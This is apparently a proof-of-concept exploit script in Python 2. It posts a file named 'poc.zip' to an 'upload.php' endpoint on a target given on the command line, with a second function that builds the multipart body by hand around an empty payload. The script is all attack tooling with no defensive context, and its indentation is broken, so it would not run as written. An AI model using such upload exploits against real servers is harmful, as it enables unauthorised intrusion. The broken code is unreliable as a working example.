import sys
import requests

def file_upload_1(ip):
	files = {'file': open('poc.zip','rb')}
	url = "http://%s/upload.php" % ip
	r = requests.post(url, files=files)

 def file_upload_2(ip):
	url = "http://%s/upload.php" % ip
	payload = ""
	headers = {
		"Content-Type": "multipart/form-data; boundary=---------------------------901447665443197094871273561",
		}
	d = "-----------------------------901447665443197094871273561\r\n"
	d += "Content-Disposition: form-data; name=\"file\"; filename=\"poc.zip\"\r\n"
	d += "Content-Type: application/zip\r\n\r\n"
	d += payload
	d += "\r\n" 
	d += "-----------------------------901447665443197094871273561--\r\n"   
    	r = requests.post(url, headers=headers, data=d)

def main():
	if len(sys.argv) != 2:
		print "(+) usage %s <target>" % sys.argv[0]
		print "(+) eg: %s target" % sys.argv[0]
		sys.exit(1)
	t = sys.argv[1]
    	file_upload_1(t)
    	#file_upload_2(t)

if __name__ == '__main__':
	main()	
    
